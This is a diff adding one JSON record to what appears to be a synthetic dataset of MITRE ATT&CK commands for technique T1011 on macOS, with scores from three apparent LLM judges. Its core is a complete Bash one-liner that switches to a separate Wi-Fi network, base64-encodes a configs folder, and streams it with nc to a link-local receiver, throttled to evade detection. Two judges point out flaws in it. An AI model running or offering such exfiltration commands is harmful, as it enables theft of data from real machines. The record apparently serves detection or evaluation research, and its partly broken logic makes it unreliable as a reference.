@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"staging-149\" \"sTag149%\" && tar -C /Users/Shared/exports -czf - configs | openssl base64 -A | while read -r l; do printf \"%s\\n\" \"$l\" | nc -6 fe80::cafe:5eed:ba11:5eed%en0 53219 -w 1; sleep 0.3; done",
+  "explanation": "Streams base64-encoded config data line-by-line over a separate Wi\u2011Fi SSID to an IPv6 link-local receiver on a high port, reducing burst signatures and using an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Ensure no active connection to monitored Wi\u2011Fi.",
+    "Join a staging SSID separate from the primary channel.",
+    "Compress and base64-encode the configs.",
+    "Throttle and send line-by-line over IPv6 link-local tied to en0 on a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-80a90c22",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The pipeline, control operators, quoting, loop structure, and flags (airport -z, networksetup -setairportnetwork, tar -czf -, openssl base64 -A, nc -6 with scoped IPv6) are all well-formed and parseable.",
+        "semantic_score": 1,
+        "semantic_justification": "Although it packages and transmits data over a Wi\u2011Fi link with base64 and netcat, this is network exfiltration (and -A collapses to a single line) rather than removal via physical media per the provided T1011 description, and it also contradicts the claimed privilege level by using sudo.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T06:52:40.742447Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&, |), balanced quotes, valid flags for all tools (airport, networksetup, tar, openssl, nc), and appropriate piping between commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1011 technique by disconnecting from current WiFi, connecting to a specific staging network, compressing config files, encoding them with base64, and exfiltrating them line-by-line over IPv6 to a specific endpoint with timing controls to avoid detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:52:44.034740Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for all commands, pipes, logical operators, and argument formatting, including balanced quotes and valid flags.",
+        "semantic_score": 2,
+        "semantic_justification": "The command semantically fails in two key areas: the `networksetup` command would likely fail without `sudo` under 'Privilege: None', and `openssl base64 -A` produces a single long line, negating the 'line-by-line' exfiltration and burst signature reduction claimed by the `while read` loop and `sleep`.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:53:05.921851Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
